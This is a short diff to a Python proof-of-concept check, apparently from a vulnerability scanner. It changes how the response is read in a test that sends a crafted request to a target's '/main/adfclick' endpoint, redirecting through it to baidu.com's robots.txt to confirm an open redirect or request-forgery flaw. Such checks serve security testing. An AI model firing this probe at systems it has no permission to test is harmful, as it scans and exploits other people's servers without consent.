@@ -48,7 +48,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             vul_url = arg + '/main/adfclick?db=afanie&bid=10911%2C5331%2C223&cid=185%2C4%2C1&sid=11131&show=ignore&url=http://baidu.com/robots.txt'
             response = requests.get(vul_url)
-            if response.status_code == 200 and 'Baiduspider' in response.content:
+            if response.status_code == 200 and 'Baiduspider' in response.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
